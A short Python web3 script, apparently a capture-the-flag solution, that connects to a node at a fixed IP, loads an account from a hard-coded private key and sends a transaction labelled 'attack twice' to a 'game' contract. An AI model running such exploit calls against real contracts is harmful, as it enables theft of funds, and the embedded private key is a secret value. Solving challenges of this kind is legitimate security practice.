from web3 import Web3,HTTPProvider
from Crypto.Util.number import *
web3=Web3(HTTPProvider("http://140.210.217.225:8545"))
print(web3.isConnected())
acct= web3.eth.account.from_key('7bb22bc28680d0b414a7affb8ff9059291524611ab54f336f985a8ef2c5b6e77')
print(acct.address)
"""

"""

game_address="0xc7C6f3893fF863bc070630C86bBeb26Cf0a07e0d"
# attack twice
def deploy(rawTx):
    signedTx = web3.eth.account.signTransaction(rawTx, private_key=acct.privateKey)
    hashTx = web3.eth.sendRawTransaction(signedTx.rawTransaction).hex()
    receipt = web3.eth.waitForTransactionReceipt(hashTx)
    print(receipt)
    return receipt


def call(): 
    rawTx = {
        'from': acct.address,
        'to': game_address,
        'nonce': web3.eth.getTransactionCount(acct.address),
        'gasPrice': web3.toWei(1,'gwei'),
        'gas': 487260,
        'value': web3.toWei(0, 'ether'),
        'data': '0x890eba68',
        "chainId": 8888
    }
    deploy(rawTx)

    
if __name__ == '__main__':
    
    call()